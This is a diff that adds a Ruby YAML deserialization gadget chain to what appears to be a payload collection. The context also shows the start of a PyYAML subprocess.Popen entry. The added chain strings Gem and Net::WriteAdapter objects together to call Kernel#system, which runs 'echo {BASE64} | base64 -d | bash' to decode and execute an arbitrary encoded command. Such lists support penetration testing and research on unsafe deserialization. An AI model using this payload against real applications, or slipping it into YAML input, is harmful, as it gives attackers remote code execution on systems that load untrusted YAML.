@@ -1369,6 +1369,25 @@ payload:
         - !ruby/object:Gem::Source::SpecificFile
             spec:
     - |
+      - !ruby/object:Gem::Installer
+          i: x
+      - !ruby/object:Gem::SpecFetcher
+          i: y
+      - !ruby/object:Gem::Requirement
+        requirements:
+          !ruby/object:Gem::Package::TarReader
+          io: &1 !ruby/object:Net::BufferedIO
+            io: &1 !ruby/object:Gem::Package::TarReader::Entry
+               read: 0
+               header: "abc"
+            debug_output: &1 !ruby/object:Net::WriteAdapter
+               socket: &1 !ruby/object:Gem::RequestSet
+                   sets: !ruby/object:Net::WriteAdapter
+                       socket: !ruby/module 'Kernel'
+                       method_id: :system
+                   git_set: "echo {BASE64} | base64 -d | bash"
+               method_id: :resolve
+    - |
       # Python (PyYAML #1)
 
       !!python/object/apply:subprocess.Popen
